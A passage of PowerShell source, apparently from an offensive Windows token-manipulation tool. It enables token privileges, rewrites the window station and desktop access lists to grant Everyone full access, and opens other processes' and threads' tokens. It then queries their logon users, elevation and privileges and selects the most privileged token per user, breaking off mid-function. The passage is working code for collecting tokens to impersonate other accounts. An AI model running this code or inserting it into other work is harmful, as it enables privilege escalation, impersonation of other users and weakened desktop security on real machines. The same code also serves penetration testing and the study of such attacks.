        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes

        $Global:TokenPriv = $TokenPrivileges

	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($Result -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }

        $CloseHandle.Invoke($ThreadToken) | Out-Null
    }


    #Enable SeSecurityPrivilege, needed to query security information for desktop DACL
    function Enable-Privilege
    {
        Param(
            [Parameter()]
            [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
                "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
                "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
                "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
                "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
                "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
                "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
                "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
            [String]
            $Privilege
        )

	    [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
	    if ($ThreadHandle -eq [IntPtr]::Zero)
	    {
		    Throw "Unable to get the handle to the current thread"
	    }
		
	    [IntPtr]$ThreadToken = [IntPtr]::Zero
	    [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()

	    if ($Result -eq $false)
	    {
		    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
		    {
			    $Result = $ImpersonateSelf.Invoke($Win32Constants.SECURITY_DELEGATION)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
				
			    $Result = $OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
			    if ($Result -eq $false)
			    {
				    Throw (New-Object ComponentModel.Win32Exception)
			    }
		    }
		    else
		    {
			    Throw ([ComponentModel.Win32Exception] $ErrorCode)
		    }
	    }

        $CloseHandle.Invoke($ThreadHandle) | Out-Null
	
        $LuidSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
        $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
        $LuidObject = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

	    $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)

	    if ($Result -eq $false)
	    {
		    Throw (New-Object ComponentModel.Win32Exception)
	    }

        [UInt32]$LuidAndAttributesSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
        $LuidAndAttributesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
        $LuidAndAttributes = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

        $LuidAndAttributes.Luid = $LuidObject
        $LuidAndAttributes.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
        $TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
	    $TokenPrivileges.PrivilegeCount = 1
	    $TokenPrivileges.Privileges = $LuidAndAttributes

        $Global:TokenPriv = $TokenPrivileges

        Write-Verbose "Attempting to enable privilege: $Privilege"
	    $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
	    if ($Result -eq $false)
	    {
            Throw (New-Object ComponentModel.Win32Exception)
	    }

        $CloseHandle.Invoke($ThreadToken) | Out-Null
        Write-Verbose "Enabled privilege: $Privilege"
    }


    #Change the ACL of the WindowStation and Desktop
    function Set-DesktopACLs
    {
        Enable-Privilege -Privilege SeSecurityPrivilege

        #Change the privilege for the current window station to allow full privilege for all users
        $WindowStationStr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("WinSta0")
        $hWinsta = $OpenWindowStationW.Invoke($WindowStationStr, $false, $Win32Constants.ACCESS_SYSTEM_SECURITY -bor $Win32Constants.READ_CONTROL -bor $Win32Constants.WRITE_DAC)

        if ($hWinsta -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }

        Set-DesktopACLToAllowEveryone -hObject $hWinsta
        $CloseHandle.Invoke($hWinsta) | Out-Null

        #Change the privilege for the current desktop to allow full privilege for all users
        $hDesktop = $OpenDesktopA.Invoke("default", 0, $false, $Win32Constants.DESKTOP_GENERIC_ALL -bor $Win32Constants.WRITE_DAC)
        if ($hDesktop -eq [IntPtr]::Zero)
        {
            Throw (New-Object ComponentModel.Win32Exception)
        }

        Set-DesktopACLToAllowEveryone -hObject $hDesktop
        $CloseHandle.Invoke($hDesktop) | Out-Null
    }


    function Set-DesktopACLToAllowEveryone
    {
        Param(
            [IntPtr]$hObject
            )

        [IntPtr]$ppSidOwner = [IntPtr]::Zero
        [IntPtr]$ppsidGroup = [IntPtr]::Zero
        [IntPtr]$ppDacl = [IntPtr]::Zero
        [IntPtr]$ppSacl = [IntPtr]::Zero
        [IntPtr]$ppSecurityDescriptor = [IntPtr]::Zero
        #0x7 is window station, change for other types
        $retVal = $GetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
        if ($retVal -ne 0)
        {
            Write-Error "Unable to call GetSecurityInfo. ErrorCode: $retVal"
        }

        if ($ppDacl -ne [IntPtr]::Zero)
        {
            $AclObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ppDacl, [Type]$ACL)

            #Add all users to acl
            [UInt32]$RealSize = 2000
            $pAllUsersSid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RealSize)
            $Success = $CreateWellKnownSid.Invoke(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
            if (-not $Success)
            {
                Throw (New-Object ComponentModel.Win32Exception)
            }

            #For user "Everyone"
            $TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TRUSTEE)
            $TrusteePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TrusteeSize)
            $TrusteeObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TrusteePtr, [Type]$TRUSTEE)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrusteePtr)
            $TrusteeObj.pMultipleTrustee = [IntPtr]::Zero
            $TrusteeObj.MultipleTrusteeOperation = 0
            $TrusteeObj.TrusteeForm = $Win32Constants.TRUSTEE_IS_SID
            $TrusteeObj.TrusteeType = $Win32Constants.TRUSTEE_IS_WELL_KNOWN_GROUP
            $TrusteeObj.ptstrName = $pAllUsersSid

            #Give full permission
            $ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EXPLICIT_ACCESS)
            $ExplicitAccessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ExplicitAccessSize)
            $ExplicitAccess = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExplicitAccessPtr, [Type]$EXPLICIT_ACCESS)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ExplicitAccessPtr)
            $ExplicitAccess.grfAccessPermissions = 0xf03ff
            $ExplicitAccess.grfAccessMode = $Win32constants.GRANT_ACCESS
            $ExplicitAccess.grfInheritance = $Win32Constants.OBJECT_INHERIT_ACE
            $ExplicitAccess.Trustee = $TrusteeObj

            [IntPtr]$NewDacl = [IntPtr]::Zero

            $RetVal = $SetEntriesInAclW.Invoke(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
            if ($RetVal -ne 0)
            {
                Write-Error "Error calling SetEntriesInAclW: $RetVal"
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAllUsersSid)

            if ($NewDacl -eq [IntPtr]::Zero)
            {
                throw "New DACL is null"
            }

            #0x7 is window station, change for other types
            $RetVal = $SetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
            if ($RetVal -ne 0)
            {
                Write-Error "SetSecurityInfo failed. Return value: $RetVal"
            }

            $LocalFree.Invoke($ppSecurityDescriptor) | Out-Null
        }
    }


    #Get the primary token for the specified processId
    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,

            #Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.
            [Parameter()]
            [Switch]
            $FullPrivs
        )

        if ($FullPrivs)
        {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        }
        else
        {
            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
        }

        $ReturnStruct = New-Object PSObject

        $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
        if ($hProcess -eq [IntPtr]::Zero)
        {
            #If a process is a protected process it cannot be enumerated. This call should only fail for protected processes.
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)

            #Close the handle to hProcess (the process handle)
            if (-not $CloseHandle.Invoke($hProcess))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hProcess = [IntPtr]::Zero

            if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
                return $null
            }
            else
            {
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
            }
        }

        return $ReturnStruct
    }


    function Get-ThreadToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ThreadId
        )

        $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS

        $RetStruct = New-Object PSObject
        [IntPtr]$hThreadToken = [IntPtr]::Zero

        $hThread = $OpenThread.Invoke($Win32Constants.THREAD_ALL_ACCESS, $false, $ThreadId)
        if ($hThread -eq [IntPtr]::Zero)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER) #The thread probably no longer exists
            {
                Write-Warning "Failed to open thread handle for ThreadId: $ThreadId. Error code: $ErrorCode"
            }
        }
        else
        {
            $Success = $OpenThreadToken.Invoke($hThread, $TokenPrivs, $false, [Ref]$hThreadToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if (($ErrorCode -ne $Win32Constants.ERROR_NO_TOKEN) -and  #This error is returned when the thread isn't impersonated
                 ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER)) #Probably means the thread was closed
                {
                    Write-Warning "Failed to call OpenThreadToken for ThreadId: $ThreadId. Error code: $ErrorCode"
                }
            }
            else
            {
                if($Instance){
                    Write-Verbose "$Instance : Successfully queried thread token"
                }else{
                    Write-Verbose "Successfully queried thread token"
                }
            }

            #Close the handle to hThread (the thread handle)
            if (-not $CloseHandle.Invoke($hThread))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close thread handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hThread = [IntPtr]::Zero
        }

        $RetStruct | Add-Member -MemberType NoteProperty -Name hThreadToken -Value $hThreadToken
        return $RetStruct
    }


    #Gets important information about the token such as the logon type associated with the logon
    function Get-TokenInformation
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )

        $ReturnObj = $null

        $TokenStatsSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_STATISTICS)
        [IntPtr]$TokenStatsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenStatsSize)
        [UInt32]$RealSize = 0
        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenStatistics, $TokenStatsPtr, $TokenStatsSize, [Ref]$RealSize)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "GetTokenInformation failed. Error code: $ErrorCode"
        }
        else
        {
            $TokenStats = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenStatsPtr, [Type]$TOKEN_STATISTICS)

            #Query LSA to determine what the logontype of the session is that the token corrosponds to, as well as the username/domain of the logon
            $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenStats.AuthenticationId, $LuidPtr, $false)

            [IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
            $ReturnVal = $LsaGetLogonSessionData.Invoke($LuidPtr, [Ref]$LogonSessionDataPtr)
            if ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
            {
                Write-Warning "Call to LsaGetLogonSessionData failed. Error code: $ReturnVal. LogonSessionDataPtr = $LogonSessionDataPtr"
            }
            else
            {
                $LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type]$SECURITY_LOGON_SESSION_DATA)
                if ($LogonSessionData.Username.Buffer -ne [IntPtr]::Zero -and 
                    $LogonSessionData.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    #Get the username and domainname associated with the token
                    $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.Username.Buffer, $LogonSessionData.Username.Length/2)
                    $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.LoginDomain.Buffer, $LogonSessionData.LoginDomain.Length/2)

                    #If UserName is for the computer account, figure out what account it actually is (SYSTEM, NETWORK SERVICE)
                    #Only do this for the computer account because other accounts return correctly. Also, doing this for a domain account 
                    #results in querying the domain controller which is unwanted.
                    if ($Username -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]$Size = 100
                        [UInt32]$NumUsernameChar = $Size / 2
                        [UInt32]$NumDomainChar = $Size / 2
                        [UInt32]$SidNameUse = 0
                        $UsernameBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $DomainBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $Success = $LookupAccountSidW.Invoke([IntPtr]::Zero, $LogonSessionData.Sid, $UsernameBuffer, [Ref]$NumUsernameChar, $DomainBuffer, [Ref]$NumDomainChar, [Ref]$SidNameUse)

                        if ($Success)
                        {
                            $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($UsernameBuffer)
                            $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($DomainBuffer)
                        }
                        else
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "Error calling LookupAccountSidW. Error code: $ErrorCode"
                        }

                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UsernameBuffer)
                        $UsernameBuffer = [IntPtr]::Zero
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($DomainBuffer)
                        $DomainBuffer = [IntPtr]::Zero
                    }

                    $ReturnObj = New-Object PSObject
                    $ReturnObj | Add-Member -Type NoteProperty -Name Domain -Value $Domain
                    $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username    
                    $ReturnObj | Add-Member -Type NoteProperty -Name hToken -Value $hToken
                    $ReturnObj | Add-Member -Type NoteProperty -Name LogonType -Value $LogonSessionData.LogonType


                    #Query additional info about the token such as if it is elevated
                    $ReturnObj | Add-Member -Type NoteProperty -Name IsElevated -Value $false

                    $TokenElevationSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_ELEVATION)
                    $TokenElevationPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenElevationSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenElevation, $TokenElevationPtr, $TokenElevationSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode" 
                    }
                    else
                    {
                        $TokenElevation = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenelevationPtr, [Type]$TOKEN_ELEVATION)
                        if ($TokenElevation.TokenIsElevated -ne 0)
                        {
                            $ReturnObj.IsElevated = $true
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenElevationPtr)


                    #Query the token type to determine if the token is a primary or impersonation token
                    $ReturnObj | Add-Member -Type NoteProperty -Name TokenType -Value "UnableToRetrieve"

                    [UInt32]$TokenTypeSize = 4
                    [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypeSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenType, $TokenTypePtr, $TokenTypeSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$TokenType = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenTypePtr, [Type][UInt32])
                        switch($TokenType)
                        {
                            1 {$ReturnObj.TokenType = "Primary"}
                            2 {$ReturnObj.TokenType = "Impersonation"}
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)


                    #Query the impersonation level if the token is an Impersonation token
                    if ($ReturnObj.TokenType -ieq "Impersonation")
                    {
                        $ReturnObj | Add-Member -Type NoteProperty -Name ImpersonationLevel -Value "UnableToRetrieve"

                        [UInt32]$ImpersonationLevelSize = 4
                        [IntPtr]$ImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ImpersonationLevelSize) #sizeof uint32
                        [UInt32]$RealSize = 0
                        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenImpersonationLevel, $ImpersonationLevelPtr, $ImpersonationLevelSize, [Ref]$RealSize)
                        if (-not $Success)
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                        }
                        else
                        {
                            [UInt32]$ImpersonationLevel = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImpersonationLevelPtr, [Type][UInt32])
                            switch ($ImpersonationLevel)
                            {
                                0 { $ReturnObj.ImpersonationLevel = "SecurityAnonymous" }
                                1 { $ReturnObj.ImpersonationLevel = "SecurityIdentification" }
                                2 { $ReturnObj.ImpersonationLevel = "SecurityImpersonation" }
                                3 { $ReturnObj.ImpersonationLevel = "SecurityDelegation" }
                            }
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ImpersonationLevelPtr)
                    }


                    #Query the token sessionid
                    $ReturnObj | Add-Member -Type NoteProperty -Name SessionID -Value "Unknown"

                    [UInt32]$TokenSessionIdSize = 4
                    [IntPtr]$TokenSessionIdPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenSessionIdSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenSessionId, $TokenSessionIdPtr, $TokenSessionIdSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$TokenSessionId = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenSessionIdPtr, [Type][UInt32])
                        $ReturnObj.SessionID = $TokenSessionId
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenSessionIdPtr)


                    #Query the token privileges
                    $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesEnabled -Value @()
                    $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesAvailable -Value @()

                    [UInt32]$TokenPrivilegesSize = 1000
                    [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenPrivileges, $TokenPrivilegesPtr, $TokenPrivilegesSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
                        
                        #Loop through each privilege
                        [IntPtr]$PrivilegesBasePtr = [IntPtr](Add-SignedIntAsUnsigned $TokenPrivilegesPtr ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$TOKEN_PRIVILEGES, "Privileges")))
                        $LuidAndAttributeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
                        for ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++)
                        {
                            $LuidAndAttributePtr = [IntPtr](Add-SignedIntAsUnsigned $PrivilegesBasePtr ($LuidAndAttributeSize * $i))

                            $LuidAndAttribute = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributePtr, [Type]$LUID_AND_ATTRIBUTES)

                            #Lookup privilege name
                            [UInt32]$PrivilegeNameSize = 60
                            $PrivilegeNamePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PrivilegeNameSize)
                            $PLuid = $LuidAndAttributePtr #The Luid structure is the first object in the LuidAndAttributes structure, so a ptr to LuidAndAttributes also points to Luid

                            $Success = $LookupPrivilegeNameW.Invoke([IntPtr]::Zero, $PLuid, $PrivilegeNamePtr, [Ref]$PrivilegeNameSize)
                            if (-not $Success)
                            {
                                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                                Write-Warning "Call to LookupPrivilegeNameW failed. Error code: $ErrorCode. RealSize: $PrivilegeNameSize"
                            }
                            $PrivilegeName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($PrivilegeNamePtr)

                            #Get the privilege attributes
                            $PrivilegeStatus = ""
                            $Enabled = $false

                            if ($LuidAndAttribute.Attributes -eq 0)
                            {
                                $Enabled = $false
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) -eq $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) #enabled by default
                            {
                                $Enabled = $true
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED) -eq $Win32Constants.SE_PRIVILEGE_ENABLED) #enabled
                            {
                                $Enabled = $true
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_REMOVED) -eq $Win32Constants.SE_PRIVILEGE_REMOVED) #SE_PRIVILEGE_REMOVED. This should never exist. Write a warning if it is found so I can investigate why/how it was found.
                            {
                                Write-Warning "Unexpected behavior: Found a token with SE_PRIVILEGE_REMOVED. Please report this as a bug. "
                            }

                            if ($Enabled)
                            {
                                $ReturnObj.PrivilegesEnabled += ,$PrivilegeName
                            }
                            else
                            {
                                $ReturnObj.PrivilegesAvailable += ,$PrivilegeName
                            }

                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PrivilegeNamePtr)
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)

                }
                else
                {
                    Write-Verbose "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length)"
                }

                #Free LogonSessionData
                $ntstatus = $LsaFreeReturnBuffer.Invoke($LogonSessionDataPtr)
                $LogonSessionDataPtr = [IntPtr]::Zero
                if ($ntstatus -ne 0)
                {
                    Write-Warning "Call to LsaFreeReturnBuffer failed. Error code: $ntstatus"
                }
            }

            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
            $LuidPtr = [IntPtr]::Zero
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenStatsPtr)
        $TokenStatsPtr = [IntPtr]::Zero

        return $ReturnObj
    }


    #Takes an array of TokenObjects built by the script and returns the unique ones
    function Get-UniqueTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [Object[]]
            $AllTokens
        )

        $TokenByUser = @{}
        $TokenByEnabledPriv = @{}
        $TokenByAvailablePriv = @{}

        #Filter tokens by user
        foreach ($Token in $AllTokens)
        {
            $Key = $Token.Domain + "\" + $Token.Username
            if (-not $TokenByUser.ContainsKey($Key))
            {
                #Filter out network logons and junk Windows accounts. This filter eliminates accounts which won't have creds because
                #    they are network logons (type 3) or logons for which the creds don't matter like LOCOAL SERVICE, DWM, etc..
                if ($Token.LogonType -ne 3 -and
                    $Token.Username -inotmatch "^DWM-\d+$" -and
                    $Token.Username -inotmatch "^LOCAL\sSERVICE$")
                {
                    $TokenByUser.Add($Key, $Token)
                }
            }
            else
            {
                #If Tokens have equal elevation levels, compare their privileges.
                if($Token.IsElevated -eq $TokenByUser[$Key].IsElevated)
                {
                    if (($Token.PrivilegesEnabled.Count + $Token.PrivilegesAvailable.Count) -gt ($TokenByUser[$Key].PrivilegesEnabled.Count + $TokenByUser[$Key].PrivilegesAvailable.Count))
                    {
                        $TokenByUser[$Key] = $Token
                    }
                }
                #If the new token is elevated and the current token isn't, use the new token
                elseif (($Token.IsElevated -eq $true) -and ($TokenByUser[$Key].IsElevated -eq $false))
                {
                    $TokenByUser[$Key] = $Token
                }
            }
        }

        #Filter tokens by privilege
        foreach ($Token in $AllTokens)
        {
